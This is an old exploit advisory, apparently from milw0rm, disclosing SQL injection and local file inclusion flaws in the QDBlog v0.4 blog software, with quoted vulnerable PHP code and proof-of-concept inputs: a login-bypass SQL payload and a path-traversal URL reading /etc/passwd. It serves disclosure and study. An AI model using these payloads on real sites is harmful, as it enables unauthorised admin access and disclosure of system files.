@@ -1,0 +1,80 @@
+  .      .        .  
+._ | _.  .|_  _. _.;_/
+[_)|(_]\_|[ )(_](_.| \.net
+|      ._|            
+"QDBlog v0.4 - MULTIPLE VULNERABILITIES"
+	by Omni
+
+1) Infos
+---------
+Date            : 2007-04-12
+Product         : QDBlog
+Version         : v0.4 - Prior version maybe also be affected
+Vendor          : http://sourceforge.net/projects/qdblog/
+Vendor Status   : 2007-04-12 -> Not Informed!
+
+Description     : QDBlog is an open-source, simple, minimalistic blogging solution. It makes use of PHP and MySQL. It is
+                  tiny (goal size is <50kb), and flexible. It designed to be based around choice. However it is
+                  more targeted toward the adept user/web master.
+
+Source          : omnipresent - omni
+E-mail          : omnipresent[at]email[dot]it - omni[at]playhack[dot]net
+Team            : Playhack.net Security
+
+2) Security Issues
+-------------------
+
+--- [ SQL Injection - Admin Access Bypass ] ---
+===============================================
+
+[ authenticate.php Script - Line 7 - 9 ]
+
+$sql = "SELECT permissions, username FROM $prefix"."auth WHERE username = '" . $_POST['username'] . "' AND password =
+MD5('".$_POST['wordpass']."');";
+
+	$query = mysql_query($sql, $conn);
+
+[ end script aithenticate.php ]
+
+As we can see the variables passed with POST method from login.php to authenticate.php (username and password) are not
+properly sanitized before being used, so an attacker can inject SQL code and gain access to the administration pannel.
+
+--- [ PoC ] ---
+===============
+
+Put in the username field (in login.php) a code like 1' OR '1' = '1' # and in the password filed what you want.
+Click.. login and.. have fun :D  
+
+--- [ Local File Inclusion ] ---
+================================
+
+There are some security problem, concerning Local File Inclusion, in lots of files of this PHP Blog; for example in
+index.php as shown below:
+
+[ categories.php script - Line 2 ]
+
+include("themes/$theme/cat_top.php");
+
+[ end index.php script ]
+
+$theme is not properly sanitized before being used so an attacker can include other files for eg /etc/passwd.
+
+--- [ PoC ] ---
+===============
+
+http://remote_host/qdblog/categories.php?theme=../../../../../../../etc/passwd%00
+
+
+Take again a look to categories.php:
+  
+in this file there is "an other vulnerability", File Traversal:
+ 
+   Line 3 : $file1 = fopen("themes/$theme/cat_mid.html", "r");
+
+
+
+---- [ Patch ] ----
+
+Edit the source code to ensure that the input is validated.
+
+# milw0rm.com [2007-04-13]
